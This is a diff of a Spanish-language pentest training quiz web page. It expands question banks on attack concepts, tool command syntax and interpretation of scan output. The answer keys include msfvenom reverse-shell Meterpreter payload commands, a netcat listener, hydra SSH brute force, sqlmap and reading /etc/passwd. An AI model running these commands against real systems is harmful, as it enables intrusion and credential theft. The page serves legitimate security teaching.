@@ -6,74 +6,40 @@
     <title>Pentest Training Hub - Docente NMZ</title>
     <style>
         :root {
-            --neon: #00ff41;
-            --dark: #050505;
-            --panel: #111;
-            --dim-green: #003b00;
-            --danger: #ff3131;
-            --blue: #00d2ff;
+            --neon: #00ff41; --dark: #050505; --panel: #111;
+            --dim-green: #003b00; --danger: #ff3131;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { 
-            background-color: var(--dark); 
-            color: var(--neon); 
+            background-color: var(--dark); color: var(--neon); 
             font-family: 'Courier New', Courier, monospace; 
-            min-height: 100-vh;
-            display: flex; flex-direction: column; align-items: center;
+            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
         }
-
-        /* MARCA DE AGUA */
         body::after {
-            content: "Docente NMZ - Pentest v2.0 - 2026";
+            content: "Docente NMZ - Security Labs - 2026";
             position: fixed; bottom: 10px; right: 20px; font-size: 10px; opacity: 0.3;
         }
-
         #app { width: 100%; max-width: 900px; padding: 40px 20px; }
 
-        /* VISTA: MENÚ PRINCIPAL */
-        .hub-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px; margin-top: 30px;
-        }
-
+        /* VISTAS */
+        .hub-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-top: 30px; }
         .hub-card {
-            background: var(--panel);
-            border: 1px solid var(--dim-green);
-            padding: 30px; border-radius: 8px;
-            cursor: pointer; transition: 0.3s;
-            text-align: center;
+            background: var(--panel); border: 1px solid var(--dim-green);
+            padding: 30px; border-radius: 8px; cursor: pointer; transition: 0.3s; text-align: center;
         }
-
         .hub-card:hover { border-color: var(--neon); box-shadow: 0 0 15px rgba(0,255,65,0.2); transform: translateY(-5px); }
-        .hub-card h3 { margin-bottom: 15px; color: #fff; text-transform: uppercase; }
-        .hub-card p { font-size: 13px; color: var(--neon); opacity: 0.7; }
+        .hub-card h3 { margin-bottom: 10px; color: #fff; }
 
-        /* TERMINAL / INTERFAZ DE JUEGO */
-        .terminal {
-            border: 1px solid var(--neon); background: var(--panel);
-            border-radius: 5px; overflow: hidden;
-        }
-        .term-header { background: #222; padding: 10px 15px; display: flex; justify-content: space-between; font-size: 12px; }
+        .terminal { border: 1px solid var(--neon); background: var(--panel); border-radius: 5px; overflow: hidden; }
+        .term-header { background: #222; padding: 10px 15px; display: flex; justify-content: space-between; font-size: 11px; }
         .term-body { padding: 30px; }
 
-        .output-box { 
-            background: #000; padding: 15px; border: 1px solid #222; 
-            margin: 15px 0; font-size: 13px; color: #ccc; white-space: pre-wrap;
-        }
+        .output-box { background: #000; padding: 15px; border: 1px solid #222; margin-bottom: 20px; font-size: 14px; color: #ccc; white-space: pre-wrap; }
+        input { background: transparent; border: none; border-bottom: 1px solid var(--neon); color: var(--neon); width: 100%; font-size: 18px; padding: 10px 0; outline: none; margin-bottom: 20px; }
 
-        input {
-            background: transparent; border: none; border-bottom: 1px solid var(--neon);
-            color: var(--neon); width: 100%; font-size: 18px; padding: 10px 0; outline: none; margin: 15px 0;
-        }
-
-        .btn {
-            background: transparent; border: 1px solid var(--neon); color: var(--neon);
-            padding: 12px 25px; cursor: pointer; font-weight: bold; font-family: inherit;
-        }
+        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 12px 25px; cursor: pointer; font-family: inherit; font-weight: bold; }
         .btn:hover { background: var(--neon); color: #000; }
-        .btn-back { border-color: #666; color: #666; margin-bottom: 20px; display: inline-block; text-decoration: none; font-size: 12px; }
+        .btn-back { color: #666; text-decoration: none; font-size: 12px; margin-bottom: 20px; display: inline-block; }
 
         .feedback { margin-top: 20px; padding: 15px; border-radius: 5px; display: none; border: 1px dashed; }
         .success { border-color: var(--neon); color: #fff; }
@@ -82,141 +48,153 @@
 </head>
 <body>
 
-<div id="app">
-    </div>
+<div id="app"></div>
 
 <script>
-    // --- BASES DE DATOS ---
-    const DB = {
+    const BANCO_DATOS = {
         conceptos: [
-            { q: "En la metodología de Pentesting, ¿qué diferencia a un escaneo 'Silent' (Sigiloso) de uno normal?", a: "sigilo", e: "El sigilo (como el SYN scan -sS) no completa el handshake TCP, evitando que muchos firewalls registren el intento de conexión." },
-            { q: "¿Qué fase sigue inmediatamente después de la Explotación exitosa?", a: "post-explotación", e: "La post-explotación incluye persistencia, escalada de privilegios y recolección de datos." }
+            { q: "¿Cómo se llama la fase donde se busca información pública de la víctima (OSINT)?", a: "reconocimiento", e: "El reconocimiento es la base de todo ataque." },
+            { q: "Si un ataque requiere que la víctima haga clic en un link, ¿qué tipo de ingeniería es?", a: "social", e: "La ingeniería social explota el eslabón más débil: el humano." },
+            { q: "¿Qué protocolo se usa comúnmente para la transferencia de archivos sin cifrar (Puerto 21)?", a: "ftp", e: "FTP es inseguro porque viaja en texto plano." },
+            { q: "¿Cómo se denomina a la shell que 'llama' de vuelta al atacante?", a: "reverse shell", e: "La Reverse Shell es ideal para evadir firewalls de entrada." },
+            { q: "¿Qué puerto usa por defecto el servicio de acceso remoto seguro SSH?", a: "22", e: "SSH (Secure Shell) reemplazó a Telnet por su cifrado." },
+            { q: "¿Qué siglas definen a un ataque que satura un servicio para dejarlo inaccesible?", a: "ddos", e: "Distributed Denial of Service." },
+            { q: "¿Cómo se llama el proceso de elevar privilegios de usuario normal a Root?", a: "escalada", e: "La escalada de privilegios es clave en post-explotación." },
+            { q: "¿Qué técnica busca vulnerabilidades inyectando datos maliciosos en formularios web?", a: "inyeccion", e: "Como SQL Injection o XSS." },
+            { q: "¿Cómo se llama al hacker que trabaja legalmente para mejorar la seguridad?", a: "white hat", e: "Sombrero blanco o hacker ético." },
+            { q: "¿Qué herramienta es el estándar para escaneo de puertos y servicios?", a: "nmap", e: "Nmap: Network Mapper." },
+            { q: "¿Qué puerto usa el protocolo HTTP por defecto?", a: "80", e: "El puerto 80 es para tráfico web no cifrado." },
+            { q: "¿Y el puerto para HTTPS (Cifrado)?", a: "443", e: "Cifrado mediante SSL/TLS." },
+            { q: "¿Qué técnica consiste en probar miles de claves hasta adivinar la correcta?", a: "fuerza bruta", e: "Brute Force Attack." },
+            { q: "¿Cómo se llama el archivo de Linux que contiene los hashes de las contraseñas?", a: "shadow", e: "/etc/shadow solo es accesible por root." },
+            { q: "¿Qué puerto usa el protocolo SMB para compartir archivos en Windows?", a: "445", e: "Puerto crítico en entornos Active Directory." },
+            { q: "¿Qué comando de Linux te dice qué usuario eres actualmente?", a: "whoami", e: "Básico para situarse tras ganar una shell." },
+            { q: "¿Cómo se llama el software que explota una vulnerabilidad específica?", a: "exploit", e: "El exploit es el 'vehículo' que transporta el payload." },
+            { q: "¿Y la carga útil que ejecuta el código malicioso?", a: "payload", e: "El payload es lo que realmente hace el daño o nos da la shell." },
+            { q: "¿Cómo se llama la vulnerabilidad de 'Ejecución Remota de Código'?", a: "rce", e: "Remote Code Execution, la más peligrosa." },
+            { q: "¿Qué puerto usa el servicio de base de datos MySQL?", a: "3306", e: "Puerto estándar de MySQL." }
         ],
         comandos: [
-            { q: "ESCENARIO: Genera un payload para Linux x64 en formato ELF con IP 10.0.2.15 puerto 4444.", a: "msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 -f elf", e: "Msfvenom es la herramienta estándar para generar payloads maliciosos." },
-            { q: "ESCENARIO: Pon un listener de Netcat en modo escucha, puerto 4444, sin resolución DNS.", a: "nc -lvnp 4444", e: "l:listen, v:verbose, n:no dns, p:port." }
+            { q: "NMAP: Escanea versiones (-sV) de la IP 10.10.10.5.", a: "nmap -sV 10.10.10.5", e: "-sV detecta versiones de servicios." },
+            { q: "NC: Escucha en el puerto 4444 de forma detallada y sin DNS.", a: "nc -lvnp 4444", e: "l:listen, v:verbose, n:no-dns, p:port." },
+            { q: "DIRB: Busca directorios en http://test.com usando common.txt.", a: "dirb http://test.com /usr/share/wordlists/dirb/common.txt", e: "Formato: URL + Ruta Wordlist." },
+            { q: "MSFVENOM: Crea un payload Windows x64 reverse_tcp para LHOST 10.0.0.1 (formato exe).", a: "msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.1 -f exe", e: "Payload estándar de Metasploit." },
+            { q: "LINUX: Cambia los permisos de 'script.sh' para que sea ejecutable.", a: "chmod +x script.sh", e: "Vital para ejecutar herramientas subidas." },
+            { q: "NMAP: Escaneo rápido (-F) y agresivo (-T4) a 192.168.1.1.", a: "nmap -F -T4 192.168.1.1", e: "-F escanea los 100 puertos principales." },
+            { q: "NIKTO: Escaneo básico al host http://10.0.2.15.", a: "nikto -h http://10.0.2.15", e: "-h especifica el host." },
+            { q: "HYDRA: Ataque SSH al usuario 'admin' con la lista 'pass.txt' en la IP 1.1.1.1.", a: "hydra -l admin -P pass.txt 1.1.1.1 ssh", e: "-l minúscula para un solo usuario." },
+            { q: "LINUX: Lee el contenido del archivo /etc/passwd.", a: "cat /etc/passwd", e: "Permite ver usuarios del sistema." },
+            { q: "METASPLOIT: Comando para buscar módulos relacionados con 'smb'.", a: "search smb", e: "Dentro de msfconsole." },
+            { q: "NMAP: Escaneo UDP (-sU) al puerto 53 de la IP 10.10.10.1.", a: "nmap -sU -p 53 10.10.10.1", e: "Escaneo de servicios DNS." },
+            { q: "WPSCAN: Escanea vulnerabilidades del sitio http://blog.com.", a: "wpscan --url http://blog.com", e: "Específico para WordPress." },
+            { q: "LINUX: Muestra la configuración de red e IP (comando moderno).", a: "ip a", e: "Reemplaza al antiguo ifconfig." },
+            { q: "GOBUSTER: Enumeración de directorios (-u http://site.com -w list.txt).", a: "gobuster dir -u http://site.com -w list.txt", e: "Más rápido que Dirb." },
+            { q: "SQLMAP: Escanea la URL http://site.com/id=1 de forma automática.", a: "sqlmap -u http://site.com/id=1 --batch", e: "--batch acepta todo por defecto." },
+            { q: "NETSTAT: Muestra puertos abiertos y procesos en escucha.", a: "netstat -tulpn", e: "Clave para post-explotación." },
+            { q: "MSFVENOM: Lista todos los payloads disponibles.", a: "msfvenom -l payloads", e: "Para buscar el payload exacto." },
+            { q: "SMBCLIENT: Lista comparticiones de la IP 10.10.10.2 sin password.", a: "smbclient -L //10.10.10.2 -N", e: "-N: No password." },
+            { q: "CRACKSTATION: (Teoría) ¿Qué comando de Linux busca archivos con permiso SUID?", a: "find / -perm -4000", e: "Clásico para escalar privilegios." },
+            { q: "NMAP: Guarda el resultado en formato normal en el archivo 'scan.txt'.", a: "nmap 10.10.10.1 -oN scan.txt", e: "-oN: Output Normal." }
         ],
         analisis: [
-            { 
-                q: "ANALIZA EL OUTPUT DE NMAP:\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\n\n¿Por qué este servicio es una prioridad crítica?", 
-                a: "backdoor", 
-                e: "La versión 2.3.4 de vsftpd contiene un backdoor famoso que permite acceso root inmediato mediante el envío de un ':)' en el nombre de usuario." 
-            },
-            {
-                q: "ANALIZA EL OUTPUT DE NIKTO:\n+ /phpMyAdmin/: phpMyAdmin directory found\n+ OSVDB-3092: /cgi-bin/test.cgi: Arbitrary shell execution.\n\n¿Cuál es el hallazgo de mayor impacto?",
-                a: "test.cgi",
-                e: "La ejecución de shell arbitraria en /cgi-bin/ permite un RCE (Remote Code Execution) directo."
-            }
+            { q: "NMAP OUTPUT:\n21/tcp open ftp vsftpd 2.3.4\n¿Qué debes buscar en Google/Search?", a: "vsftpd 2.3.4 exploit", e: "Siempre busca la versión exacta + exploit." },
+            { q: "NIKTO OUTPUT:\n+ OSVDB-3092: /cgi-bin/test.cgi: Arbitrary shell execution.\n¿Qué tipo de vulnerabilidad es?", a: "rce", e: "Ejecución remota de comandos." },
+            { q: "SERVICE SCAN:\n8180/tcp open http Apache Tomcat/Coyote\n¿Cuál es la ruta de administración por defecto?", a: "/manager/html", e: "Aquí es donde probamos credenciales default." },
+            { q: "SSH BANNER:\nSSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1\n¿Es una versión actual o antigua?", a: "antigua", e: "Versiones 4.x tienen muchos años y fallos conocidos." },
+            { q: "ENUMERACIÓN:\nEncuentras un archivo 'config.php.bak'. ¿Qué buscarías dentro?", a: "credenciales", e: "O contraseñas de base de datos." },
+            { q: "HTTP HEADERS:\nServer: Microsoft-IIS/6.0\n¿A qué sistema operativo apunta probablemente?", a: "windows server 2003", e: "IIS 6.0 es muy antiguo (Windows 2003)." },
+            { q: "SMB SCAN:\nAnonymous login allowed en /público.\n¿Qué herramienta usarías para entrar?", a: "smbclient", e: "Para navegar carpetas SMB." },
+            { q: "BROWSER:\nVes una página en blanco con: 'SQL syntax error near...'. ¿Qué ataque probarías?", a: "sql injection", e: "Los errores visibles son oro para inyecciones." },
+            { q: "NMAP SCRIPT:\n| http-enum: /admin/ (403 Forbidden)\n¿Qué significa el código 403?", a: "prohibido", e: "Acceso denegado, pero el directorio existe." },
+            { q: "MSFCONSOLE:\nExploit completed, but no session was created.\n¿Qué falló probablemente?", a: "payload", e: "O el firewall bloqueó la conexión de vuelta." },
+            { q: "PORT SCAN:\n445/tcp open microsoft-ds?\n¿Qué protocolo corre aquí?", a: "smb", e: "Server Message Block." },
+            { q: "LOGS:\n100 intentos de login en 1 segundo desde la misma IP.\n¿Qué está pasando?", a: "fuerza bruta", e: "Intento de adivinar pass masivo." },
+            { q: "URL:\nsite.com/view?file=../../etc/passwd\n¿Cómo se llama esta vulnerabilidad?", a: "lfi", e: "Local File Inclusion." },
+            { q: "SISTEMA:\nwhoami -> 'www-data'\n¿Tienes privilegios de administrador?", a: "no", e: "www-data es el usuario limitado del servidor web." },
+            { q: "NMAP:\nPuerto 3389 open.\n¿Qué servicio es?", a: "rdp", e: "Remote Desktop Protocol." },
+            { q: "CURSO:\nEncuentras una clave RSA privada. ¿Para qué servicio sirve?", a: "ssh", e: "Permite entrar sin contraseña si está autorizada." },
+            { q: "REPORTE:\nVulnerabilidad Crítica: EternalBlue.\n¿Qué puerto afecta?", a: "445", e: "Afecta a SMB v1." },
+            { q: "WEB:\nFormulario de contacto sin validación. Envías <script>alert(1)</script> y funciona.\n¿Qué es?", a: "xss", e: "Cross Site Scripting." },
+            { q: "ROUTER:\nPanel de control pide user/pass. Pruebas admin/admin y entras.\n¿Qué falló?", a: "credenciales por defecto", e: "Falla de seguridad básica." },
+            { q: "CONSOLA:\nMeterpreter session 1 opened.\n¿Ya tienes el control?", a: "si", e: "Has ganado acceso al sistema." }
         ]
     };
 
-    // --- MOTOR DEL HUB ---
-    let currentModule = null;
-    let currentIndex = 0;
+    let moduloActual = "";
+    let preguntasSesion = [];
+    let indicePregunta = 0;
 
-    function switchView(view) {
+    function iniciarHub() {
         const app = document.getElementById('app');
-        
-        if (view === 'menu') {
-            app.innerHTML = `
-                <h1 style="text-align:center; font-size: 24px;">PENTEST TRAINING HUB</h1>
-                <p style="text-align:center; color:#555; font-size:12px;">Security Dashboard | Kali Environment</p>
-                
-                <div class="hub-grid">
-                    <div class="hub-card" onclick="startModule('conceptos')">
-                        <h3>MODO ACADEMIA</h3>
-                        <p>Estrategia, fases y teoría de ataque.</p>
-                    </div>
-                    <div class="hub-card" onclick="startModule('comandos')">
-                        <h3>MODO TERMINAL</h3>
-                        <p>Precisión técnica y sintaxis pura.</p>
-                    </div>
-                    <div class="hub-card" onclick="startModule('analisis')">
-                        <h3>MODO FORENSE</h3>
-                        <p>Detección de vulns en logs y escaneos.</p>
-                    </div>
-                </div>
-            `;
-        } else {
-            renderGame();
-        }
-    }
-
-    function startModule(mod) {
-        currentModule = mod;
-        currentIndex = 0;
-        switchView('game');
-    }
-
-    function renderGame() {
-        const app = document.getElementById('app');
-        const data = DB[currentModule][currentIndex];
-
         app.innerHTML = `
-            <a href="#" class="btn-back" onclick="switchView('menu')"><< VOLVER AL HUB</a>
+            <h1 style="text-align:center;">PENTEST TRAINING HUB</h1>
+            <p style="text-align:center; color:#555; font-size:12px; margin-bottom:30px;">Selecciona tu área de entrenamiento - NMZ</p>
+            <div class="hub-grid">
+                <div class="hub-card" onclick="cargarModulo('conceptos')"><h3>ACADEMIA</h3><p>Conceptos y Metodología (Nivel Básico)</p></div>
+                <div class="hub-card" onclick="cargarModulo('comandos')"><h3>TERMINAL</h3><p>Sintaxis y Comandos (Nivel Medio)</p></div>
+                <div class="hub-card" onclick="cargarModulo('analisis')"><h3>FORENSE</h3><p>Análisis de Resultados (Nivel Experto)</p></div>
+            </div>
+        `;
+    }
+
+    function cargarModulo(mod) {
+        moduloActual = mod;
+        indicePregunta = 0;
+        // Mezclar y seleccionar 10
+        preguntasSesion = [...BANCO_DATOS[mod]].sort(() => Math.random() - 0.5).slice(0, 10);
+        mostrarPregunta();
+    }
+
+    function mostrarPregunta() {
+        const app = document.getElementById('app');
+        const data = preguntasSesion[indicePregunta];
+        app.innerHTML = `
+            <a href="#" class="btn-back" onclick="iniciarHub()"><< VOLVER AL MENÚ</a>
             <div class="terminal">
-                <div class="term-header">
-                    <span>${currentModule.toUpperCase()} ENGINE</span>
-                    <span>MODO: PENTEST_AUDIT</span>
-                </div>
+                <div class="term-header"><span>MODO: ${moduloActual.toUpperCase()}</span><span>${indicePregunta + 1}/10</span></div>
                 <div class="term-body">
                     <div class="output-box">${data.q}</div>
-                    <div style="font-size: 14px;">root@kali:~#</div>
-                    <input type="text" id="userInput" autofocus autocomplete="off" spellcheck="false">
+                    <input type="text" id="userInput" placeholder="Respuesta..." autofocus autocomplete="off" spellcheck="false">
                     <div id="fb" class="feedback"></div>
-                    <div id="actions" style="margin-top:20px;">
-                        <button class="btn" onclick="check()">EJECUTAR</button>
-                    </div>
+                    <div id="btnCont" style="margin-top:20px;"><button class="btn" onclick="validar()">ANALIZAR</button></div>
                 </div>
             </div>
         `;
-
         const input = document.getElementById('userInput');
-        input.onkeypress = (e) => { if(e.key === 'Enter') check(); };
+        input.onkeypress = (e) => { if(e.key === 'Enter') validar(); };
         input.focus();
     }
 
-    function check() {
+    function validar() {
         const input = document.getElementById('userInput');
-        const val = input.value.toLowerCase();
-        const data = DB[currentModule][currentIndex];
+        const user = input.value.toLowerCase().trim();
+        const data = preguntasSesion[indicePregunta];
         const fb = document.getElementById('fb');
         
-        const isOk = val.includes(data.a.toLowerCase());
-        
+        const esCorrecto = user.includes(data.a.toLowerCase());
         fb.style.display = "block";
         input.disabled = true;
 
-        if(isOk) {
+        if(esCorrecto) {
             fb.className = "feedback success";
-            fb.innerHTML = `[+] ACCESO CONCEDIDO.<br><span style="font-size:12px; color:#aaa;">${data.e}</span>`;
+            fb.innerHTML = `[+] CORRECTO: ${data.e}`;
         } else {
             fb.className = "feedback error";
-            fb.innerHTML = `[-] ACCESO DENEGADO.<br><span style="font-size:12px; color:#aaa;">${data.e}</span><br><br>SINTAXIS ESPERADA: ${data.a}`;
+            fb.innerHTML = `[-] INCORRECTO. Respuesta esperada: ${data.a}<br><span style="font-size:11px; opacity:0.7;">${data.e}</span>`;
         }
 
-        document.getElementById('actions').innerHTML = `
-            <button class="btn" onclick="next()">CONTINUAR >></button>
-        `;
+        document.getElementById('btnCont').innerHTML = `<button class="btn" onclick="siguiente()">${indicePregunta < 9 ? 'SIGUIENTE' : 'FINALIZAR'}</button>`;
     }
 
-    function next() {
-        currentIndex++;
-        if (currentIndex < DB[currentModule].length) {
-            renderGame();
-        } else {
-            document.getElementById('app').innerHTML = `
-                <div style="text-align:center;">
-                    <h2>MÓDULO FINALIZADO</h2>
-                    <p style="margin:20px 0;">Has completado el entrenamiento de ${currentModule.toUpperCase()}.</p>
-                    <button class="btn" onclick="switchView('menu')">REGRESAR AL HUB</button>
-                </div>
-            `;
+    function siguiente() {
+        indicePregunta++;
+        if(indicePregunta < 10) mostrarPregunta();
+        else {
+            document.getElementById('app').innerHTML = `<div style="text-align:center;"><h2>ENTRENAMIENTO COMPLETADO</h2><p style="margin:20px 0;">Has procesado 10 vectores de información.</p><button class="btn" onclick="iniciarHub()">REINICIAR HUB</button></div>`;
         }
     }
 
-    // Iniciar
-    switchView('menu');
+    iniciarHub();
 </script>
 </body>
 </html>
